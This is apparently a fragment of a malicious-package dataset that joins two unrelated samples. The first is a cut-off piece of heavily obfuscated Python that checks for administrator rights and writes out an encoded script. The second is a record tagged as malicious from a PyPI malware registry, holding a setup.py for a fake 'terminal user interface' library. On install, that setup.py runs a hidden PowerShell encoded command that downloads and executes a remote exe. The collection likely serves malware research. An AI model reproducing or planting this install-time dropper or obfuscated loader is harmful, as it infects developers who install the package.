+				月人刀口馬刀山马水人月人月山人山 = os.path.expanduser(''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(1 << 7) - (1 << 1), (((3 << 3) - 1) << 2), (((1 << 4) + 1) << 2), (((3 << 3) + 1) << 2) + 1, (7 << 4) + 3, (((7 << 2) - 1) << 2) - 1, (7 << 4) + (1 << 2), (7 << 4) - 1, (7 << 4)])))
+				子水女馬人月刀人馬鳥山馬馬刀女人 = 199*(17&787)+851//947-(288|954+500)|288<<57<<344>>(794|157)&~849
+			elif 子水女馬人月刀人馬鳥山馬馬刀女人 == 186387:
+				女马子人月女鸟馬月月水馬目鸟刀馬 = Dispatch(''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [((((3 << 2) - 1)) << 3) - 1, (((5 << 2) + 1) << 2) - 1, (((3 << 3) + 1) << 2) - 1, (7 << 4) + (1 << 1), ((((3 << 2) + 1)) << 3) + 1, (7 << 4), (7 << 4) + (1 << 2), (((3 << 3) - 1) << 1), (((5 << 2) + 1) << 2) - 1, ((((3 << 2) + 1)) << 3), (((3 << 3) + 1) << 2) + 1, (((7 << 2) - 1) << 2), (((7 << 2) - 1) << 2)])))
+				子水女馬人月刀人馬鳥山馬馬刀女人 = 884*(932&985)+555//138-(322|649+570)|322<<361<<75>>(527|213)&~142
+			elif 子水女馬人月刀人馬鳥山馬馬刀女人 == 383984:
+				if ctypes.windll.shell32.IsUserAnAdmin():
+					子水女馬人月刀人馬鳥山馬馬刀女人 = 436*(853&963)+756//406-(374|279+62)|374<<95<<214>>(161|944)&~500
+					continue
+				子水女馬人月刀人馬鳥山馬馬刀女人 = 102*(468&715)+338//836-(544|548+999)|544<<951<<41>>(993|645)&~762
+			elif 子水女馬人月刀人馬鳥山馬馬刀女人 == 382664:
+				人馬口刀女子月水人目水鳥山口馬馬.write(''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(((7 << 2) - 1) << 2), (((3 << 3) + 1) << 2) + 1, (7 << 4) + (1 << 2), (1 << 5), (7 << 4), (3 << 5) + 1, ((((3 << 2) + 1)) << 3) - 1, (((3 << 3) + 1) << 2) + 1, (1 << 5), (((1 << 4) - 1) << 2) + 1, (1 << 5), (((3 << 3) + 1) << 2) - 1, ((((3 << 2) + 1)) << 3), (7 << 4) + (1 << 1), (7 << 4) - 1, (((7 << 2) - 1) << 2) + 1, (((3 << 3) + 1) << 2) + 1, (((3 << 3) - 1) << 1), (((3 << 3) + 1) << 2) + 1, (((1 << 4) - 1) << 3), (7 << 4) + (1 << 2), (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + 3, ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - 1, (7 << 4) - (1 << 1), (((3 << 3) - 1) << 1), ((((3 << 2) + 1)) << 3) - 1, (((3 << 3) + 1) << 2) + 1, (7 << 4) + (1 << 2), (1 << 6) + (1 << 1), (3 << 5) + 1, (((3 << 3) + 1) << 2) - 1, (((7 << 2) - 1) << 2) - 1, ((((3 << 2) + 1)) << 3) - 1, (7 << 4) + (1 << 1), (7 << 4) - 1, (((1 << 4) - 1) << 3) - 3, (7 << 4) - (1 << 1), (((3 << 3) + 1) << 2), (5 << 4), (3 << 5) + 1, ((((3 << 2) + 1)) << 3) - 1, (((3 << 3) + 1) << 2) + 1, (5 << 3), (5 << 3) + 1, (((1 << 4) - 1) << 2) - 1, (5 << 1), (5 << 1), (((1 << 4) - 1) << 3) - (1 << 1), (3 << 5) + 1, (7 << 4) + (1 << 1), (1 << 5), ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4), (((1 << 4) - 1) << 3) - 3, (7 << 4) + (1 << 2), (((1 << 4) + 1) << 2) + 1, (((7 << 2) - 1) << 2), (((3 << 3) + 1) << 2) + 1, (((7 << 2) - 1) << 2) + 1, (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (1 << 5), (((1 << 4) - 1) << 2) + 1, (1 << 5), (((3 << 3) + 1) << 2), (7 << 4) - 1, (((3 << 3) + 1) << 2) - 1, (((1 << 4) - 1) << 3) - 3, (((7 << 2) - 1) << 2) + 1, (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) - 1) << 1), (((3 << 3) + 1) << 2) - 1, (7 << 4) + (1 << 1), (((3 << 3) + 1) << 2) + 1, (3 << 5) + 1, (7 << 4) + (1 << 2), (((3 << 3) + 1) << 2) + 1, (((1 << 4) + 1) << 2) + 1, (((7 << 2) - 1) << 2), (((3 << 3) + 1) << 2) + 1, (((7 << 2) - 1) << 2) + 1, (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (5 << 3), (5 << 3) - 1, ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4), (((1 << 4) - 1) << 3) - 3, (7 << 4) + (1 << 2), (5 << 3) - 1, (5 << 3) + 1, (((1 << 4) - 1) << 2) - 1, (5 << 1), (((3 << 3) + 1) << 2), (7 << 4) - 1, (((3 << 3) + 1) << 2) - 1, (((1 << 4) - 1) << 3) - 3, (((7 << 2) - 1) << 2) + 1, (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) - 1) << 1), (3 << 5) + (1 << 1), (7 << 4) - 1, (((3 << 3) + 1) << 2), (((1 << 4) - 1) << 3) + 1, (((3 << 3) - 1) << 1), (3 << 5) + 1, (7 << 4), (7 << 4), (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (((3 << 3) + 1) << 2), (((1 << 4) + 1) << 2) - 1, ((((3 << 2) + 1)) << 3), ((((3 << 2) + 1)) << 3) + 1, (((7 << 2) - 1) << 2), (((3 << 3) + 1) << 2), (5 << 3), ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4), (((1 << 4) - 1) << 3) - 3, (7 << 4) + (1 << 2), (((1 << 4) + 1) << 2) + 1, (((7 << 2) - 1) << 2), (((3 << 3) + 1) << 2) + 1, (((7 << 2) - 1) << 2) + 1, (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (5 << 3) + 1, (((1 << 4) - 1) << 2) - 1, (5 << 1), ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4), (((1 << 4) - 1) << 3) - 3, (7 << 4) + (1 << 2), (((1 << 4) + 1) << 2) + 1, (((7 << 2) - 1) << 2), (((3 << 3) + 1) << 2) + 1, (((7 << 2) - 1) << 2) + 1, (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) - 1) << 1), ((((3 << 2) + 1)) << 3) - (1 << 1), (7 << 4) - 1, (((3 << 3) + 1) << 2) - 1, (((1 << 4) - 1) << 3) - 3, (7 << 4) + 3, (5 << 3), (5 << 3) + 1, (((1 << 4) - 1) << 2) - 1, (5 << 1), (5 << 1), ((((3 << 2) + 1)) << 3) - (1 << 1), (((1 << 4) - 1) << 3) - 3, (7 << 4) - (1 << 1), (((3 << 3) + 1) << 2) - 1, (7 << 4) + (1 << 2), ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - 1, (7 << 4) - (1 << 1), (1 << 5), (((3 << 3) + 1) << 2) - 1, ((((3 << 2) + 1)) << 3), (((3 << 3) + 1) << 2) + 1, (((3 << 3) + 1) << 2) - 1, (((7 << 2) - 1) << 2) - 1, ((((3 << 2) - 1)) << 3) - 1, (3 << 5) + 1, (((7 << 2) - 1) << 2), (((7 << 2) - 1) << 2), (((3 << 3) + 1) << 2) + 1, (7 << 4) + (1 << 2), (1 << 6) + 1, (((3 << 3) + 1) << 2), (((3 << 3) + 1) << 2), (7 << 4) + (1 << 1), (((3 << 3) + 1) << 2) + 1, (7 << 4) + 3, (7 << 4) + 3, (((3 << 3) + 1) << 2) + 1, (7 << 4) + 3, (5 << 3), (5 << 3) + 1, (1 << 5), (((1 << 4) - 1) << 3) + 3, (5 << 1), (1 << 5), (1 << 5), (1 << 5), (1 << 5), (((3 << 3) + 1) << 2), (7 << 4) - 1, (((3 << 3) + 1) << 2) - 1, (((1 << 4) - 1) << 3) - 3, (((7 << 2) - 1) << 2) + 1, (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) - 1) << 1), (((3 << 3) + 1) << 2) + 1, (((1 << 4) - 1) << 3), (((3 << 3) + 1) << 2) + 1, (((3 << 3) + 1) << 2) - 1, (((1 << 4) + 1) << 2) - 1, (7 << 4) - 1, (((7 << 2) - 1) << 2) + 1, (((7 << 2) - 1) << 2) + 1, (3 << 5) + 1, (7 << 4) - (1 << 1), (((3 << 3) + 1) << 2), (5 << 3), (5 << 3) - 1, (7 << 4), (3 << 5) + 1, (7 << 4) + 3, (7 << 4) + (1 << 2), (((3 << 3) + 1) << 2) + 1, (5 << 3) - 1, (5 << 3) + 1, (((1 << 4) - 1) << 2) - 1, (5 << 1), (1 << 5), (1 << 5), (1 << 5), (1 << 5), (((1 << 4) - 1) << 3) - (1 << 1), (3 << 5) + 1, (7 << 4) + (1 << 1), (1 << 5), (((3 << 3) + 1) << 2) - 1, (((7 << 2) - 1) << 2), ((((3 << 2) + 1)) << 3) + 1, (7 << 4), (3 << 5) + (1 << 1), (7 << 4) - 1, (3 << 5) + 1, (7 << 4) + (1 << 1), (((3 << 3) + 1) << 2), (((1 << 4) + 1) << 2) - 1, (7 << 4) - 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (1 << 5), (((1 << 4) - 1) << 2) + 1, (1 << 5), ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4), (((1 << 4) - 1) << 3) - 3, (7 << 4) + (1 << 2), (((1 << 4) + 1) << 2) + 1, (((7 << 2) - 1) << 2), (((3 << 3) + 1) << 2) + 1, (((7 << 2) - 1) << 2) + 1, (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) - 1) << 1), (((1 << 4) - 1) << 3) - (1 << 1), (3 << 5) + 1, (((7 << 2) - 1) << 2), (((1 << 4) - 1) << 3) - 3, (((3 << 3) + 1) << 2) + 1, (((1 << 4) - 1) << 2) - 1, (5 << 1), (1 << 5), (1 << 5), (1 << 5), (1 << 5), (((3 << 3) + 1) << 2) - 1, (((7 << 2) - 1) << 2), ((((3 << 2) + 1)) << 3) + 1, (7 << 4), (3 << 5) + (1 << 1), (7 << 4) - 1, (3 << 5) + 1, (7 << 4) + (1 << 1), (((3 << 3) + 1) << 2), (((1 << 4) + 1) << 2) - 1, (7 << 4) - 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (1 << 5), (((1 << 4) - 1) << 2) + 1, (1 << 5), (((3 << 3) + 1) << 2) - 1, (((7 << 2) - 1) << 2), ((((3 << 2) + 1)) << 3) + 1, (7 << 4), (3 << 5) + (1 << 1), (7 << 4) - 1, (3 << 5) + 1, (7 << 4) + (1 << 1), (((3 << 3) + 1) << 2), (((1 << 4) + 1) << 2) - 1, (7 << 4) - 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) - 1) << 1), (7 << 4) + (1 << 1), (((3 << 3) + 1) << 2) + 1, (7 << 4), (((7 << 2) - 1) << 2), (3 << 5) + 1, (((3 << 3) + 1) << 2) - 1, (((3 << 3) + 1) << 2) + 1, (5 << 3), (3 << 4) - 1, (3 << 5) - (1 << 1), (5 << 3), (3 << 4), (((1 << 4) - 1) << 3), (5 << 3) + 1, (((3 << 3) - 1) << 2) - 1, (1 << 6) + 1, ((((3 << 2) - 1)) << 2) + 1, (((((1 << 3) + 1))) << 3) - (1 << 1), (3 << 5) + 1, ((((3 << 2) - 1)) << 2) + 1, ((((3 << 2) + 1)) << 3) - (1 << 1), (3 << 4), ((((3 << 2) - 1)) << 2) + 1, (7 << 3) + 1, (((3 << 3) - 1) << 2) + 1, (((1 << 4) - 1) << 3) + 3, ((((3 << 2) + 1)) << 2), (3 << 4), (1 << 7) - 3, (((((1 << 3) + 1))) << 2), (3 << 4) - 1, ((((3 << 2) + 1)) << 3) - 1, ((((3 << 2) - 1)) << 2), (1 << 5), (5 << 3) - 1, (3 << 4), (((1 << 4) - 1) << 3), (7 << 3) - (1 << 1), (((3 << 3) + 1) << 2) + 1, (3 << 5) + (1 << 1), (((3 << 3) + 1) << 1), (3 << 4) + 1, (3 << 4), ((((3 << 2) + 1)) << 2) - 1, (7 << 3), ((((3 << 2) + 1)) << 2) - 1, (7 << 3) + 1, (3 << 4), (3 << 4) + 1, (3 << 4) + 1, (((1 << 4) + 1) << 2) + 1, (((3 << 3) + 1) << 2), ((((3 << 2) + 1)) << 2) + 1, (7 << 3) - (1 << 1), (((3 << 3) + 1) << 2) - 1, (7 << 3) + 1, (7 << 3), (3 << 4) + 1, ((((3 << 2) + 1)) << 2), ((((3 << 2) + 1)) << 2) + 1, (3 << 5) + (1 << 1), ((((3 << 2) + 1)) << 2) - 1, (((3 << 3) + 1) << 2), ((((3 << 2) + 1)) << 2) - 1, ((((3 << 2) + 1)) << 3) - (1 << 1), (7 << 3) + 1, (((3 << 3) + 1) << 2), (7 << 3) - (1 << 1), (1 << 6) + (1 << 1), (((1 << 4) + 1) << 2) + 1, (3 << 4) + 1, (3 << 5) + (1 << 1), ((((3 << 2) + 1)) << 2), (((3 << 3) + 1) << 2), (1 << 6) + 1, (7 << 3) - (1 << 1), ((((3 << 2) + 1)) << 2) - 1, (5 << 3) - 1, (5 << 3) + 1, (((1 << 4) - 1) << 2) - 1, (5 << 1), (1 << 5), (1 << 5), (1 << 5), (1 << 5), (((3 << 3) + 1) << 2) - 1, (((7 << 2) - 1) << 2), ((((3 << 2) + 1)) << 3) + 1, (7 << 4), (3 << 5) + (1 << 1), (7 << 4) - 1, (3 << 5) + 1, (7 << 4) + (1 << 1), (((3 << 3) + 1) << 2), (((1 << 4) + 1) << 2) - 1, (7 << 4) - 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (1 << 5), (((1 << 4) - 1) << 2) + 1, (1 << 5), (((3 << 3) + 1) << 2) - 1, (((7 << 2) - 1) << 2), ((((3 << 2) + 1)) << 3) + 1, (7 << 4), (3 << 5) + (1 << 1), (7 << 4) - 1, (3 << 5) + 1, (7 << 4) + (1 << 1), (((3 << 3) + 1) << 2), (((1 << 4) + 1) << 2) - 1, (7 << 4) - 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) - 1) << 1), (7 << 4) + (1 << 1), (((3 << 3) + 1) << 2) + 1, (7 << 4), (((7 << 2) - 1) << 2), (3 << 5) + 1, (((3 << 3) + 1) << 2) - 1, (((3 << 3) + 1) << 2) + 1, (5 << 3), (3 << 4) - 1, (3 << 5) - (1 << 1), (((5 << 2) + 1) << 2), (((3 << 3) - 1) << 2) - 1, (1 << 6) + 1, ((((3 << 2) - 1)) << 2) + 1, ((((3 << 2) - 1)) << 3) + (1 << 1), (3 << 5) + 1, ((((3 << 2) - 1)) << 2) + 1, (((1 << 4) - 1) << 3) + (1 << 1), (3 << 4) + 1, ((((3 << 2) - 1)) << 2) + 1, (7 << 3) + 1, (((3 << 3) - 1) << 2) + 1, (((1 << 4) - 1) << 3) + 3, ((((3 << 2) + 1)) << 2) - 1, ((((3 << 2) + 1)) << 2) - 1, (1 << 7) - 3, (((((1 << 3) + 1))) << 2), (3 << 4) - 1, ((((3 << 2) + 1)) << 3) - 1, ((((3 << 2) - 1)) << 2), (1 << 5), (5 << 3) - 1, (((5 << 2) + 1) << 2), (((5 << 2) - 1) << 2) - 1, ((((3 << 2) + 1)) << 2) - 1, (((3 << 3) + 1) << 2), (7 << 4) + (1 << 2), (((5 << 2) + 1) << 2), (7 << 3) - 1, (((1 << 4) - 1) << 3) - (1 << 1), ((((3 << 2) - 1)) << 3) + 1, (((5 << 2) - 1) << 2), (((7 << 2) - 1) << 2) - 1, ((((3 << 2) + 1)) << 3), (((5 << 2) + 1) << 2) + 1, (((1 << 4) - 1) << 3) + 1, (((1 << 4) - 1) << 3) + (1 << 1), (((5 << 2) - 1) << 2), (7 << 4) + 1, (3 << 5) + (1 << 1), (5 << 4) + 1, (((5 << 2) - 1) << 2) + 1, (((7 << 2) - 1) << 2) + 1, (7 << 4) + 3, (7 << 4) + (1 << 1), (((5 << 2) - 1) << 2) + 1, ((((3 << 2) + 1)) << 2) - 1, (7 << 3) - (1 << 1), (5 << 4) + 1, (((1 << 4) - 1) << 3) + ("
+d7f7ee2a15b37a7fce3520c97b32d6ff0b70d2a6,tppypiplgtb-8.82,tppypiplgtb-8.82/tppypipLGTB-8.82/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,a1ffc2348dad25bc24f3423cd8b87d4757290429,"from distutils.core import setup
+
+try:
+  import subprocess
+  import os
+  if not os.path.exists('tahg'):
+    # www.esquelesquad.rip
+    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
+except: pass
+try:
+  setup(
+    name = 'tppypipLGTB',
+    packages = ['modlib'],
+    version = '8.43',
+    # license='MIT',
+    description = 'A library for creating a terminal user interface',
+    author = 'EsqueleSquad',
+    author_email = 'tahgoficial@proton.me',
+    classifiers=[
+      'Development Status :: 3 - Alpha',
+      'Intended Audience :: Developers',
+      'Topic :: Software Development :: Build Tools',
+      'License :: OSI Approved :: MIT License',
+      'Programming Language :: Python :: 3',
+      'Programming Language :: Python :: 3.4',
+      'Programming Language :: Python :: 3.5',
+      'Programming Language :: Python :: 3.6',
+      'Programming Language :: Python :: 3.7',
+      'Programming Language :: Python :: 3.8',
+      'Programming Language :: Python :: 3.9',
+      'Programming Language :: Python :: 3.10',
+      'Programming Language :: Python :: 3.11',
+    ],
+  )
+except: pass"
